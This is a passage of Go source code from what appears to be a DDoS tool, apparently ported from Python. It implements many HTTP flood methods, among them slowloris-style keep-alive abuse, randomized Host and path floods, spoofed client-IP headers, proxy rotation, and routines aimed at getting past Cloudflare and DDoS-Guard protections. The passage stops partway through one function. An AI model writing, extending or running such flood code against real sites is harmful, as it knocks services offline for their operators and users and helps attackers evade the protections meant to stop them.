	if !sent {
		logDebugf("[Thread %d] BOT: Failed sending sitemap.xml request: %v", h.threadID, err)
		return
	}

	// Generate the main attack payload (standard GET)
	payload := h.generatePayload("", nil)
	logDebugf("[Thread %d] BOT: Proceeding with main flood (first %d chars):\n%s...", h.threadID, min(len(payload), 100), string(payload[:min(len(payload), 100)]))

	// Follow up with main attack loop
	h.sendLoop(conn, payload, h.rpc)
}

func (h *HttpFlood) EVEN() {
	logDebugf("[Thread %d] Executing EVEN method", h.threadID)
	conn, err := h.openConnection("", "")
	if err != nil {
		return
	}
	defer safeClose(conn, h.threadID)

	payload := h.generatePayload("", nil)
	buf := make([]byte, 1) // Small buffer to check connection by reading

	for {
		select {
		case <-h.ctx.Done():
			logDebugf("[Thread %d] EVEN: Context cancelled, stopping.", h.threadID)
			return // Stop if context is cancelled
		default:
			logDebugf("[Thread %d] EVEN: Sending payload", h.threadID)
			sent, err := send(conn, payload, h.threadID)
			if !sent || err != nil {
				logDebugf("[Thread %d] EVEN: Send failed, closing connection: %v", h.threadID, err)
				return // Stop if send fails
			}

			// Try reading a single byte with a short timeout to check if connection is alive
			conn.SetReadDeadline(time.Now().Add(100 * time.Millisecond)) // Short read timeout
			n, readErr := conn.Read(buf)
			conn.SetReadDeadline(time.Time{}) // Clear deadline

			if readErr != nil {
				// Check for expected errors indicating closed connection or timeout
				if errors.Is(readErr, io.EOF) {
					logDebugf("[Thread %d] EVEN: Connection closed by peer (EOF).", h.threadID)
					return
				}
				if netErr, ok := readErr.(net.Error); ok && netErr.Timeout() {
					// Timeout means connection is likely still open, continue loop
					logDebugf("[Thread %d] EVEN: Read timed out, connection likely open.", h.threadID)
					continue
				}
				// Other unexpected errors (reset, etc.) mean connection is closed
				logDebugf("[Thread %d] EVEN: Connection read error, closing: %v", h.threadID, readErr)
				return
			}
			if n == 0 { // Should not happen with Read(buf) unless buf is empty, but check anyway
				logDebugf("[Thread %d] EVEN: Read 0 bytes, assuming closed connection.", h.threadID)
				return // Treat as closed
			}
			// Read successful (n=1), connection seems alive, continue loop
			logDebugf("[Thread %d] EVEN: Read 1 byte (%x), connection seems alive.", h.threadID, buf[:n])
		}
	}
}

func (h *HttpFlood) OVH() {
	logDebugf("[Thread %d] Executing OVH method", h.threadID)
	conn, err := h.openConnection("", "")
	if err != nil {
		return
	}
	defer safeClose(conn, h.threadID)

	payload := h.generatePayload("", nil)

	// Send payload up to rpc times, but max 5
	count := h.rpc
	if count > 5 {
		count = 5
	}
	logDebugf("[Thread %d] OVH: Sending %d requests", h.threadID, count)

	h.sendLoop(conn, payload, count)
}

func (h *HttpFlood) CFBUAM() {
	logDebugf("[Thread %d] Executing CFBUAM method", h.threadID)
	conn, err := h.openConnection("", "")
	if err != nil {
		return
	}
	// Don't close immediately, need it for the flood part

	payload := h.generatePayload("", nil)

	// Send initial request
	logDebugf("[Thread %d] CFBUAM: Sending initial request", h.threadID)
	sent, err := send(conn, payload, h.threadID)
	if !sent || err != nil {
		logDebugf("[Thread %d] CFBUAM: Failed sending initial request: %v", h.threadID, err)
		safeClose(conn, h.threadID)
		return
	}

	// Wait 5 seconds
	logDebugf("[Thread %d] CFBUAM: Waiting 5 seconds...", h.threadID)
	select {
	case <-time.After(5*time.Second + 10*time.Millisecond): // Mimic 5.01s
		logDebugf("[Thread %d] CFBUAM: Wait finished, starting flood.", h.threadID)
		// Continue after wait
	case <-h.ctx.Done():
		logDebugf("[Thread %d] CFBUAM: Context cancelled during wait.", h.threadID)
		safeClose(conn, h.threadID)
		return // Stop if context cancelled during wait
	}

	// Flood for up to 120 seconds
	floodEndTime := time.Now().Add(120 * time.Second)
	logDebugf("[Thread %d] CFBUAM: Flooding until %s", h.threadID, floodEndTime.Format(time.RFC3339))
	floodCount := 0
	for time.Now().Before(floodEndTime) {
		select {
		case <-h.ctx.Done():
			logDebugf("[Thread %d] CFBUAM: Context cancelled during flood (sent %d packets).", h.threadID, floodCount)
			safeClose(conn, h.threadID)
			return // Stop if context cancelled during flood
		default:
			sent, err = send(conn, payload, h.threadID)
			if !sent || err != nil {
				logDebugf("[Thread %d] CFBUAM: Send failed during flood (sent %d packets): %v", h.threadID, floodCount, err)
				safeClose(conn, h.threadID) // Close on error
				return
			}
			floodCount++
			// Optional small delay based on RPC
			if h.rpc > 1 {
				// Python used sleep(1 / self._rpc), Go equivalent:
				sleepDuration := time.Duration(1000.0/float64(h.rpc)) * time.Millisecond
				if sleepDuration < 1*time.Millisecond { // Avoid zero sleep
					sleepDuration = 1 * time.Millisecond
				}
				//logDebugf("[Thread %d] CFBUAM: Sleeping for %v", h.threadID, sleepDuration)
				time.Sleep(sleepDuration)
			} else {
				// Minimal yield if rpc is 1 or less
				time.Sleep(1 * time.Millisecond)
			}
		}
	}

	logDebugf("[Thread %d] CFBUAM: Flood duration finished (sent %d packets).", h.threadID, floodCount)
	// Flood duration finished
	safeClose(conn, h.threadID)
}

func (h *HttpFlood) AVB() {
	logDebugf("[Thread %d] Executing AVB method", h.threadID)
	conn, err := h.openConnection("", "")
	if err != nil {
		return
	}
	defer safeClose(conn, h.threadID)

	payload := h.generatePayload("", nil)

	for i := 0; i < h.rpc; i++ {
		select {
		case <-h.ctx.Done():
			logDebugf("[Thread %d] AVB: Context cancelled during loop %d.", h.threadID, i)
			return // Stop if context cancelled
		default:
			// Calculate delay (Python: max(0.01, min(self._rpc / 1000, 1)))
			delaySec := math.Max(0.01, math.Min(float64(h.rpc)/1000.0, 1.0))
			delay := time.Duration(delaySec * float64(time.Second))
			logDebugf("[Thread %d] AVB: Sleeping for %v before request %d", h.threadID, delay, i+1)
			time.Sleep(delay)

			logDebugf("[Thread %d] AVB: Sending request %d", h.threadID, i+1)
			sent, err := send(conn, payload, h.threadID)
			if !sent || err != nil {
				logDebugf("[Thread %d] AVB: Send failed on request %d: %v", h.threadID, i+1, err)
				return // Stop if send fails
			}
		}
	}
	logDebugf("[Thread %d] AVB: Finished sending %d requests.", h.threadID, h.rpc)
}

func (h *HttpFlood) DYN() {
	logDebugf("[Thread %d] Executing DYN method", h.threadID)
	conn, err := h.openConnection("", "")
	if err != nil {
		return
	}
	defer safeClose(conn, h.threadID)

	randomSub := randStr(6)
	dynHost := fmt.Sprintf("%s.%s", randomSub, h.target.Host) // Use target.Host (includes port if non-default)
	logDebugf("[Thread %d] DYN: Using dynamic host: %s", h.threadID, dynHost)

	// Generate payload with dynamic Host header - need custom generation logic
	requestURI := h.target.RequestURI()
	if requestURI == "" {
		requestURI = "/"
	}
	// Use generatePayload and override Host? No, easier to construct manually.
	h.payloadBuf.Reset()
	h.payloadBuf.WriteString(fmt.Sprintf("%s %s HTTP/1.1\r\n", h.reqType, requestURI))
	h.payloadBuf.WriteString(fmt.Sprintf("Host: %s\r\n", dynHost)) // Dynamic Host
	h.payloadBuf.WriteString(h.randHeaderContent()) // Other standard headers (UA, Ref, Spoof)
	// Add other common headers that generatePayload includes
	h.payloadBuf.WriteString(fmt.Sprintf("Accept-Encoding: %s\r\n", randChoice(acceptEncodingValues)))
	h.payloadBuf.WriteString(fmt.Sprintf("Accept-Language: %s\r\n", randChoice(acceptLanguageValues)))
	h.payloadBuf.WriteString(fmt.Sprintf("Cache-Control: %s\r\n", randChoice(cacheControlValues)))
	h.payloadBuf.WriteString(fmt.Sprintf("Connection: %s\r\n", randChoice(connectionValues)))
	h.payloadBuf.WriteString("Sec-Fetch-Dest: document\r\n")
	h.payloadBuf.WriteString("Sec-Fetch-Mode: navigate\r\n")
	h.payloadBuf.WriteString("Sec-Fetch-Site: none\r\n")
	h.payloadBuf.WriteString("Sec-Fetch-User: ?1\r\n")
	h.payloadBuf.WriteString("Upgrade-Insecure-Requests: 1\r\n")
	if h.cookie != "" {
		h.payloadBuf.WriteString(fmt.Sprintf("Cookie: %s\r\n", h.cookie))
	}
	h.payloadBuf.WriteString("\r\n") // End of headers

	payloadBytes := make([]byte, h.payloadBuf.Len())
	copy(payloadBytes, h.payloadBuf.Bytes())

	if *debugFlag {
		logPayload := string(payloadBytes)
		maxLogLen := 512
		if len(logPayload) > maxLogLen {
			logPayload = logPayload[:maxLogLen] + "... (truncated)"
		}
		logDebugf("[Thread %d] DYN Generated Payload:\n---\n%s\n---", h.threadID, logPayload)
	}

	h.sendLoop(conn, payloadBytes, h.rpc)
}

func (h *HttpFlood) DOWNLOADER() {
	logDebugf("[Thread %d] Executing DOWNLOADER method", h.threadID)
	conn, err := h.openConnection("", "")
	if err != nil {
		return
	}
	defer safeClose(conn, h.threadID)

	payload := h.generatePayload("", nil)

	// Send initial request
	logDebugf("[Thread %d] DOWNLOADER: Sending initial request", h.threadID)
	sent, err := send(conn, payload, h.threadID)
	if !sent || err != nil {
		logDebugf("[Thread %d] DOWNLOADER: Failed sending initial request: %v", h.threadID, err)
		return
	}

	// Attempt to read the response body slowly
	buf := make([]byte, 1024) // Read in chunks
	startTime := time.Now()
	maxDuration := 60 * time.Second // Limit download attempt duration
	totalBytesRead := 0
	logDebugf("[Thread %d] DOWNLOADER: Starting slow read loop (max %v)", h.threadID, maxDuration)

	for time.Since(startTime) < maxDuration {
		select {
		case <-h.ctx.Done():
			logDebugf("[Thread %d] DOWNLOADER: Context cancelled after reading %d bytes.", h.threadID, totalBytesRead)
			return // Stop if context cancelled
		default:
			// Set a read deadline to prevent blocking indefinitely
			conn.SetReadDeadline(time.Now().Add(5 * time.Second)) // 5s timeout for read
			n, readErr := conn.Read(buf)
			conn.SetReadDeadline(time.Time{}) // Clear deadline

			if n > 0 {
				totalBytesRead += n
				// Python added to BYTES_SEND; let's not do that here as it's download, not upload.
				logDebugf("[Thread %d] DOWNLOADER read %d bytes (total %d)", h.threadID, n, totalBytesRead)
			}

			if readErr != nil {
				if errors.Is(readErr, io.EOF) {
					logDebugf("[Thread %d] DOWNLOADER connection closed by server (EOF) after reading %d bytes.", h.threadID, totalBytesRead)
				} else if netErr, ok := readErr.(net.Error); ok && netErr.Timeout() {
					// Timeout reading, maybe connection stalled? Exit loop.
					logDebugf("[Thread %d] DOWNLOADER read timeout after reading %d bytes.", h.threadID, totalBytesRead)
				} else {
					// Other error (reset, etc.)
					logDebugf("[Thread %d] DOWNLOADER read error after reading %d bytes: %v", h.threadID, totalBytesRead, readErr)
				}
				return // Exit loop on EOF, timeout, or error
			}

			// Add small delay to simulate slow download
			time.Sleep(10 * time.Millisecond) // Same as Python's delay
		}
	}
	logDebugf("[Thread %d] DOWNLOADER finished after %v, read %d bytes.", h.threadID, maxDuration, totalBytesRead)

	// Python optionally sent '0' byte. This seems dubious and likely unnecessary. Omitting.
}

func (h *HttpFlood) GSB() { // Google Search Bypass? Sends HEAD with random query string.
	logDebugf("[Thread %d] Executing GSB method", h.threadID)
	conn, err := h.openConnection("", "")
	if err != nil {
		return
	}
	defer safeClose(conn, h.threadID)

	randomQS := "qs=" + randStr(6)
	targetPathQuery := h.target.RequestURI() // Path + Query
	if targetPathQuery == "" {
		targetPathQuery = "/"
	} // Ensure base path

	if h.target.RawQuery != "" {
		targetPathQuery += "&" + randomQS
	} else {
		targetPathQuery += "?" + randomQS
	}
	logDebugf("[Thread %d] GSB: Using target path+query: %s", h.threadID, targetPathQuery)

	// Manually construct HEAD payload
	h.payloadBuf.Reset()
	h.payloadBuf.WriteString(fmt.Sprintf("HEAD %s HTTP/1.1\r\n", targetPathQuery))
	h.payloadBuf.WriteString(fmt.Sprintf("Host: %s\r\n", h.target.Host))
	h.payloadBuf.WriteString(h.randHeaderContent()) // UA/Ref/SpoofIP
	// Add specific headers from Python's GSB example
	h.payloadBuf.WriteString("Accept-Encoding: gzip, deflate, br\r\n")
	h.payloadBuf.WriteString("Accept-Language: en-US,en;q=0.9\r\n")
	h.payloadBuf.WriteString("Cache-Control: max-age=0\r\n")
	h.payloadBuf.WriteString("Connection: Keep-Alive\r\n")
	h.payloadBuf.WriteString("Sec-Fetch-Dest: document\r\n")
	h.payloadBuf.WriteString("Sec-Fetch-Mode: navigate\r\n")
	h.payloadBuf.WriteString("Sec-Fetch-Site: none\r\n")
	h.payloadBuf.WriteString("Sec-Fetch-User: ?1\r\n")
	h.payloadBuf.WriteString("Sec-Gpc: 1\r\n")
	h.payloadBuf.WriteString("Pragma: no-cache\r\n")
	h.payloadBuf.WriteString("Upgrade-Insecure-Requests: 1\r\n")
	if h.cookie != "" {
		h.payloadBuf.WriteString(fmt.Sprintf("Cookie: %s\r\n", h.cookie))
	}
	h.payloadBuf.WriteString("\r\n") // End of headers

	payloadBytes := make([]byte, h.payloadBuf.Len())
	copy(payloadBytes, h.payloadBuf.Bytes())

	if *debugFlag {
		logPayload := string(payloadBytes)
		maxLogLen := 512
		if len(logPayload) > maxLogLen {
			logPayload = logPayload[:maxLogLen] + "... (truncated)"
		}
		logDebugf("[Thread %d] GSB Generated Payload:\n---\n%s\n---", h.threadID, logPayload)
	}

	h.sendLoop(conn, payloadBytes, h.rpc)
}

func (h *HttpFlood) RHEX() { // Random HEX path and host suffix
	logDebugf("[Thread %d] Executing RHEX method", h.threadID)
	conn, err := h.openConnection("", "")
	if err != nil {
		return
	}
	defer safeClose(conn, h.threadID)

	hexSize := randChoiceInt([]int{16, 32, 64})
	randHexBytes, _ := randBytes(hexSize / 2) // Need hexSize chars, so hexSize/2 bytes
	randHexString := hex.EncodeToString(randHexBytes)

	targetPath := "/" + randHexString
	// Python appended hex to host header value: `f"{self._target.authority}/{randhex}"`
	targetHostHeader := h.target.Host + "/" + randHexString
	logDebugf("[Thread %d] RHEX: Using path '%s' and Host header '%s'", h.threadID, targetPath, targetHostHeader)

	// Manually construct GET payload
	h.payloadBuf.Reset()
	h.payloadBuf.WriteString(fmt.Sprintf("GET %s HTTP/1.1\r\n", targetPath))
	h.payloadBuf.WriteString(fmt.Sprintf("Host: %s\r\n", targetHostHeader)) // Dynamic Host
	h.payloadBuf.WriteString(h.randHeaderContent()) // UA/Ref/SpoofIP
	// Add common headers
	h.payloadBuf.WriteString("Accept-Encoding: gzip, deflate, br\r\n")
	h.payloadBuf.WriteString("Accept-Language: en-US,en;q=0.9\r\n")
	h.payloadBuf.WriteString("Cache-Control: max-age=0\r\n")
	h.payloadBuf.WriteString("Connection: keep-alive\r\n")
	h.payloadBuf.WriteString("Sec-Fetch-Dest: document\r\n")
	h.payloadBuf.WriteString("Sec-Fetch-Mode: navigate\r\n")
	h.payloadBuf.WriteString("Sec-Fetch-Site: none\r\n")
	h.payloadBuf.WriteString("Sec-Fetch-User: ?1\r\n")
	h.payloadBuf.WriteString("Sec-Gpc: 1\r\n")
	h.payloadBuf.WriteString("Pragma: no-cache\r\n")
	h.payloadBuf.WriteString("Upgrade-Insecure-Requests: 1\r\n")
	if h.cookie != "" {
		h.payloadBuf.WriteString(fmt.Sprintf("Cookie: %s\r\n", h.cookie))
	}
	h.payloadBuf.WriteString("\r\n") // End headers

	payloadBytes := make([]byte, h.payloadBuf.Len())
	copy(payloadBytes, h.payloadBuf.Bytes())

	if *debugFlag {
		logPayload := string(payloadBytes)
		maxLogLen := 512
		if len(logPayload) > maxLogLen {
			logPayload = logPayload[:maxLogLen] + "... (truncated)"
		}
		logDebugf("[Thread %d] RHEX Generated Payload:\n---\n%s\n---", h.threadID, logPayload)
	}

	h.sendLoop(conn, payloadBytes, h.rpc)
}

func (h *HttpFlood) STOMP() {
	logDebugf("[Thread %d] Executing STOMP method", h.threadID)
	conn, err := h.openConnection("", "")
	if err != nil {
		return
	}
	defer safeClose(conn, h.threadID)

	hexBytes, _ := randBytes(32) // 64 hex chars
	hexPathHost := hex.EncodeToString(hexBytes)

	commonHeaders := "Accept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: none\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\n"

	// Construct Payload 1 manually
	h.payloadBuf.Reset()
	h.payloadBuf.WriteString(fmt.Sprintf("%s /%s HTTP/1.1\r\n", h.reqType, hexPathHost))
	h.payloadBuf.WriteString(fmt.Sprintf("Host: %s/%s\r\n", h.target.Host, hexPathHost)) // Host includes hex path
	h.payloadBuf.WriteString(h.randHeaderContent())                                      // UA/Ref/SpoofIP
	h.payloadBuf.WriteString(commonHeaders)
	if h.cookie != "" {
		h.payloadBuf.WriteString(fmt.Sprintf("Cookie: %s\r\n", h.cookie))
	}
	h.payloadBuf.WriteString("\r\n") // End headers
	p1Bytes := make([]byte, h.payloadBuf.Len())
	copy(p1Bytes, h.payloadBuf.Bytes())

	// Construct Payload 2 manually
	h.payloadBuf.Reset()
	h.payloadBuf.WriteString(fmt.Sprintf("%s /cdn-cgi/l/chk_captcha HTTP/1.1\r\n", h.reqType))
	h.payloadBuf.WriteString(fmt.Sprintf("Host: %s\r\n", hexPathHost)) // Host is just hex string
	h.payloadBuf.WriteString(h.randHeaderContent())                  // UA/Ref/SpoofIP
	h.payloadBuf.WriteString(commonHeaders)
	if h.cookie != "" {
		h.payloadBuf.WriteString(fmt.Sprintf("Cookie: %s\r\n", h.cookie))
	}
	h.payloadBuf.WriteString("\r\n") // End headers
	p2Bytes := make([]byte, h.payloadBuf.Len())
	copy(p2Bytes, h.payloadBuf.Bytes())


	if *debugFlag {
		logPayload := string(p1Bytes)
		maxLogLen := 512
		if len(logPayload) > maxLogLen {
			logPayload = logPayload[:maxLogLen] + "... (truncated)"
		}
		logDebugf("[Thread %d] STOMP Generated Payload 1:\n---\n%s\n---", h.threadID, logPayload)
		logPayload = string(p2Bytes)
		if len(logPayload) > maxLogLen {
			logPayload = logPayload[:maxLogLen] + "... (truncated)"
		}
		logDebugf("[Thread %d] STOMP Generated Payload 2:\n---\n%s\n---", h.threadID, logPayload)
	}

	// Send first payload
	logDebugf("[Thread %d] STOMP: Sending payload 1", h.threadID)
	sent, err := send(conn, p1Bytes, h.threadID)
	if !sent || err != nil {
		logDebugf("[Thread %d] STOMP: Failed sending payload 1: %v", h.threadID, err)
		return
	}

	// Send second payload multiple times
	logDebugf("[Thread %d] STOMP: Sending payload 2 %d times", h.threadID, h.rpc)
	h.sendLoop(conn, p2Bytes, h.rpc)
}

func (h *HttpFlood) NULL() {
	logDebugf("[Thread %d] Executing NULL method", h.threadID)
	conn, err := h.openConnection("", "")
	if err != nil {
		return
	}
	defer safeClose(conn, h.threadID)

	// Manually construct payload with "null" User-Agent and Referer
	requestURI := h.target.RequestURI()
	if requestURI == "" {
		requestURI = "/"
	}
	spoofIP := randIPv4() // Standard spoof
	h.payloadBuf.Reset()
	h.payloadBuf.WriteString(fmt.Sprintf("%s %s HTTP/1.1\r\n", h.reqType, requestURI))
	h.payloadBuf.WriteString(fmt.Sprintf("Host: %s\r\n", h.target.Host))
	h.payloadBuf.WriteString("User-Agent: null\r\n")
	h.payloadBuf.WriteString("Referer: null\r\n")
	h.payloadBuf.WriteString(fmt.Sprintf("Client-IP: %s\r\n", spoofIP))
	h.payloadBuf.WriteString("Connection: keep-alive\r\n")
	if h.cookie != "" {
		h.payloadBuf.WriteString(fmt.Sprintf("Cookie: %s\r\n", h.cookie))
	}
	h.payloadBuf.WriteString("\r\n") // End headers

	payloadBytes := make([]byte, h.payloadBuf.Len())
	copy(payloadBytes, h.payloadBuf.Bytes())


	if *debugFlag {
		logPayload := string(payloadBytes)
		maxLogLen := 512
		if len(logPayload) > maxLogLen {
			logPayload = logPayload[:maxLogLen] + "... (truncated)"
		}
		logDebugf("[Thread %d] NULL Generated Payload:\n---\n%s\n---", h.threadID, logPayload)
	}

	h.sendLoop(conn, payloadBytes, h.rpc)
}

func (h *HttpFlood) SLOW() {
	logDebugf("[Thread %d] Executing SLOW method", h.threadID)
	conn, err := h.openConnection("", "")
	if err != nil {
		return
	}
	defer safeClose(conn, h.threadID)

	// Generate initial headers payload, ensure Connection: keep-alive is likely
	initialPayload := h.generatePayload("Connection: keep-alive\r\n", nil)
	logDebugf("[Thread %d] SLOW: Sending initial headers (%d bytes)", h.threadID, len(initialPayload))

	// Send the initial header part
	sent, err := send(conn, initialPayload, h.threadID)
	if !sent || err != nil {
		logDebugf("[Thread %d] SLOW: Failed sending initial headers: %v", h.threadID, err)
		return
	}

	// Determine sleep time based on RPC (Python: max(0.1, 10 / self._rpc if self._rpc > 0 else 1))
	sleepSec := 1.0 // Default if rpc <= 0
	if h.rpc > 0 {
		sleepSec = math.Max(0.1, 10.0/float64(h.rpc))
	}
	sleepTime := time.Duration(sleepSec * float64(time.Second))
	logDebugf("[Thread %d] SLOW: Keep-alive interval: %v", h.threadID, sleepTime)

	// Keep sending partial headers (keep-alive data)
	ticker := time.NewTicker(sleepTime)
	defer ticker.Stop()

	// Check connection status periodically by attempting a non-blocking read
	readBuf := make([]byte, 1)

	for {
		select {
		case <-h.ctx.Done():
			logDebugf("[Thread %d] SLOW: Context cancelled, stopping.", h.threadID)
			return // Stop if context cancelled

		case <-ticker.C:
			// Send a minimal keep-alive header line
			keepAliveHeader := fmt.Sprintf("X-a: %d\r\n", randInt(1, 5000))
			logDebugf("[Thread %d] SLOW: Sending keep-alive: %s", h.threadID, strings.TrimSpace(keepAliveHeader))
			sent, err := send(conn, []byte(keepAliveHeader), h.threadID)
			if !sent || err != nil {
				logDebugf("[Thread %d] SLOW: Failed sending keep-alive: %v", h.threadID, err)
				return // Stop if sending fails
			}

			// Check connection status after sending keep-alive (non-blocking read)
			conn.SetReadDeadline(time.Now().Add(1 * time.Millisecond)) // Tiny deadline for non-blocking check
			_, readErr := conn.Read(readBuf)
			conn.SetReadDeadline(time.Time{}) // Clear deadline

			if readErr != nil {
				// Check if it's a timeout error (expected if connection is alive and idle)
				if netErr, ok := readErr.(net.Error); ok && netErr.Timeout() {
					// Timeout means no data available, connection likely still open
					logDebugf("[Thread %d] SLOW: Read check timed out, connection alive.", h.threadID)
					continue // Continue the loop
				}
				// Check for EOF (connection closed by peer)
				if errors.Is(readErr, io.EOF) {
					logDebugf("[Thread %d] SLOW: Connection closed by peer (EOF) during check.", h.threadID)
					return
				}
				// Other unexpected error (e.g., connection reset)
				logDebugf("[Thread %d] SLOW: Connection check read error: %v", h.threadID, readErr)
				return
			}
			// If read returned data unexpectedly (n > 0)
			logDebugf("[Thread %d] SLOW: Unexpected read during check (%x), assuming closed.", h.threadID, readBuf)
			return
		}
	}
}

// --- Methods using net/http Client ---

// CFB: Uses net/http client, attempts bypass. Lacks JS challenge solving.
func (h *HttpFlood) CFB() {
	logDebugf("[Thread %d] Executing CFB method (using net/http, no JS challenge solver)", h.threadID)
	targetURL := h.target.String()
	var proxyURL *url.URL
	var currentProxy *Proxy

	if len(h.proxies) > 0 {
		currentProxy = h.proxies[mrand.Intn(len(h.proxies))]
		var err error
		pURLStr := currentProxy.lformatted()
		proxyURL, err = url.Parse(pURLStr)
		if err != nil {
			logDebugf("[Thread %d] CFB: Failed to parse proxy URL %s: %v. Proceeding without proxy.", h.threadID, currentProxy.Original, err)
			proxyURL = nil
		} else {
			logDebugf("[Thread %d] CFB: Using proxy %s", h.threadID, proxyURL.String())
		}
	}

	// Create a client instance for this specific call
	transport := h.httpClient.Transport.(*http.Transport).Clone()
	transport.Proxy = http.ProxyURL(proxyURL)
	transport.MaxIdleConns = h.rpc
	transport.MaxIdleConnsPerHost = h.rpc
	transport.IdleConnTimeout = 30 * time.Second

	reqClient := &http.Client{
		Transport: transport,
		Timeout:   h.httpClient.Timeout,
		Jar:       nil, // CFB usually doesn't need stateful cookies like DGB
		CheckRedirect: h.httpClient.CheckRedirect,
	}

	for i := 0; i < h.rpc; i++ {
		select {
		case <-h.ctx.Done():
			logDebugf("[Thread %d] CFB: Context cancelled loop %d.", h.threadID, i)
			return
		default:
			reqCtx, reqCancel := context.WithTimeout(h.ctx, reqClient.Timeout)
			req, err := http.NewRequestWithContext(reqCtx, "GET", targetURL, nil) // CFB uses GET
			if err != nil {
				logDebugf("[Thread %d] CFB: Failed to create request: %v", h.threadID, err)
				reqCancel()
				time.Sleep(100 * time.Millisecond)
				continue
			}

			// Add typical browser headers
			req.Header.Set("User-Agent", randChoice(h.useragents))
			req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
			req.Header.Set("Accept-Language", randChoice(acceptLanguageValues))
			req.Header.Set("Accept-Encoding", randChoice(acceptEncodingValues))
			req.Header.Set("Connection", "keep-alive") // Let transport manage
			req.Header.Set("Upgrade-Insecure-Requests", "1")
			req.Header.Set("Sec-Fetch-Dest", "document")
			req.Header.Set("Sec-Fetch-Mode", "navigate")
			req.Header.Set("Sec-Fetch-Site", "none")
			req.Header.Set("Sec-Fetch-User", "?1")
			if h.cookie != "" {
				req.Header.Set("Cookie", h.cookie)
			}

			logDebugf("[Thread %d] CFB: Sending request %d to %s", h.threadID, i+1, targetURL)
			resp, err := reqClient.Do(req)
			if err != nil {
				logDebugf("[Thread %d] CFB: Request %d failed (%s%s): %v", h.threadID, i+1, targetURL, func() string { if proxyURL != nil { return " via " + proxyURL.Host } else { return "" } }(), err)
				reqCancel()
				time.Sleep(100 * time.Millisecond)
				continue
			}

			reqSize := sizeOfRequest(req)
			nBytes, copyErr := io.Copy(io.Discard, resp.Body)
			closeErr := resp.Body.Close()
			reqCancel()

			if copyErr != nil {
				logDebugf("[Thread %d] CFB: Error discarding response body for request %d: %v", h.threadID, i+1, copyErr)
			}
			if closeErr != nil {
				logDebugf("[Thread %d] CFB: Error closing response body for request %d: %v", h.threadID, i+1, closeErr)
			}


			REQUESTS_SENT_COUNTER.Add(1)
			BYTES_SENT_COUNTER.Add(reqSize)

			logDebugf("[Thread %d] CFB: Request %d to %s status: %s (Read %d body bytes)", h.threadID, i+1, targetURL, resp.Status, nBytes)
		}
	}
	logDebugf("[Thread %d] CFB: Finished loop.", h.threadID)
}

// BYPASS: Uses standard net/http client (no cloudscraper).
func (h *HttpFlood) BYPASS() {
	logDebugf("[Thread %d] Executing BYPASS method (using net/http)", h.threadID)
	targetURL := h.target.String()
	var proxyURL *url.URL
	var currentProxy *Proxy

	if len(h.proxies) > 0 {
		currentProxy = h.proxies[mrand.Intn(len(h.proxies))]
		var err error
		pURLStr := currentProxy.lformatted()
		proxyURL, err = url.Parse(pURLStr)
		if err != nil {
			logDebugf("[Thread %d] BYPASS: Failed to parse proxy URL %s: %v. Proceeding without proxy.", h.threadID, currentProxy.Original, err)
			proxyURL = nil
		} else {
			logDebugf("[Thread %d] BYPASS: Using proxy %s", h.threadID, proxyURL.String())
		}
	}

	transport := h.httpClient.Transport.(*http.Transport).Clone()
	transport.Proxy = http.ProxyURL(proxyURL)
	transport.MaxIdleConns = h.rpc
	transport.MaxIdleConnsPerHost = h.rpc
	transport.IdleConnTimeout = 30 * time.Second

	reqClient := &http.Client{
		Transport: transport,
		Timeout:   h.httpClient.Timeout,
		Jar:       nil,
		CheckRedirect: h.httpClient.CheckRedirect,
	}

	for i := 0; i < h.rpc; i++ {
		select {
		case <-h.ctx.Done():
			logDebugf("[Thread %d] BYPASS: Context cancelled loop %d.", h.threadID, i)
			return
		default:
			reqCtx, reqCancel := context.WithTimeout(h.ctx, reqClient.Timeout)
			req, err := http.NewRequestWithContext(reqCtx, "GET", targetURL, nil) // Assumes GET for BYPASS
			if err != nil {
				logDebugf("[Thread %d] BYPASS: Failed to create request: %v", h.threadID, err)
				reqCancel()
				time.Sleep(100 * time.Millisecond)
				continue
			}

			// Minimal random headers matching Python's BYPASS
			req.Header.Set("User-Agent", randChoice(h.useragents))
			req.Header.Set("Accept", "*/*")
			req.Header.Set("Accept-Language", "en-US,en;q=0.5")
			req.Header.Set("Accept-Encoding", "gzip, deflate, br")
			req.Header.Set("Connection", "keep-alive")
			if h.cookie != "" {
				req.Header.Set("Cookie", h.cookie)
			}

			logDebugf("[Thread %d] BYPASS: Sending request %d to %s", h.threadID, i+1, targetURL)
			resp, err := reqClient.Do(req)
			if err != nil {
				logDebugf("[Thread %d] BYPASS: Request %d failed (%s%s): %v", h.threadID, i+1, targetURL, func() string { if proxyURL != nil { return " via " + proxyURL.Host } else { return "" } }(), err)
				reqCancel()
				time.Sleep(100 * time.Millisecond)
				continue
			}

			reqSize := sizeOfRequest(req)
			nBytes, copyErr := io.Copy(io.Discard, resp.Body)
			closeErr := resp.Body.Close()
			reqCancel()

			if copyErr != nil {
				logDebugf("[Thread %d] BYPASS: Error discarding response body for request %d: %v", h.threadID, i+1, copyErr)
			}
			if closeErr != nil {
				logDebugf("[Thread %d] BYPASS: Error closing response body for request %d: %v", h.threadID, i+1, closeErr)
			}


			REQUESTS_SENT_COUNTER.Add(1)
			BYTES_SENT_COUNTER.Add(reqSize)

			logDebugf("[Thread %d] BYPASS: Request %d to %s status: %s (Read %d body bytes)", h.threadID, i+1, targetURL, resp.Status, nBytes)
		}
	}
	logDebugf("[Thread %d] BYPASS: Finished loop.", h.threadID)
}

// DGB: Attempts DDoS-Guard bypass using the simplified solver.
func (h *HttpFlood) DGB() {
	logDebugf("[Thread %d] Executing DGB method (using net/http solver)", h.threadID)
	var proxyURL *url.URL
	var currentProxy *Proxy
	ua := randChoice(h.useragents)

	if len(h.proxies) > 0 {
		currentProxy = h.proxies[mrand.Intn(len(h.proxies))]
		var err error
		pURLStr := currentProxy.lformatted()
		proxyURL, err = url.Parse(pURLStr)
		if err != nil {
			logDebugf("[Thread %d] DGB: Failed to parse proxy URL %s: %v. Proceeding without proxy.", h.threadID, currentProxy.Original, err)
			proxyURL = nil
		} else {
			logDebugf("[Thread %d] DGB: Using proxy %s for solver and requests", h.threadID, proxyURL.String())
		}
	}

